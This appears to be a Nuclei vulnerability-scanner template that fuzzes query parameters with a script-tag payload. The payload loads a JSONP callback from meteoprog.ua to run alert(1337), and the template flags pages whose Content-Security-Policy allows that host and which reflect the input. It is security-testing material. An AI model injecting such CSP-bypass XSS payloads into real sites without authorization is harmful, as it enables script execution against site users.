id: meteoprog-csp-xss

info:
  name: Content-Security-Policy Bypass via Meteoprog
  author: DhiyaneshDK
  severity: high
  reference:
    - https://github.com/honoki/CSPBypass/blob/c7e4344226a58d96ad16a99d4446f81cd663264e/data.tsv#L193C18-L193C120
  metadata:
    verified: true
  tags: xss,csp-bypass,meteoprog

http:
  - pre-condition:
      - type: dsl
        dsl:
          - 'method == "GET"'

    payloads:
      injection:
        - '<script src="https://www.meteoprog.ua/data/weather/informer/Poltava.js?callback=alert(1337)"></script>'

    fuzzing:
      - part: query
        type: replace
        mode: single
        fuzz:
          - "{{injection}}"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "{{injection}}"

      - type: word
        part: content_type
        words:
          - "text/html"

      - type: word
        part: content_security_policy
        words:
          - "meteoprog.ua"
          - "script-src"
        condition: and